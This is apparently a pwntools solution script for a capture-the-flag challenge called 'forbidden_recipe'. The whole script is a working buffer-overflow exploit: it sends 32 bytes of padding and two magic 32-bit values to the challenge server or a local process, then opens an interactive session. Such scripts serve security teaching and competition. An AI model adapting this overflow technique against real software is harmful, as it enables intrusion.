#!/usr/bin/env python3

from pwn import *

exe = ELF("./forbidden_recipe", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("chals1.apoorvctf.xyz", 3002)

input()

payload = b'a'*0x20 + p32(0xdecafbad) + p32(0xc0ff33)
p.sendafter(b'\n', payload)

p.interactive()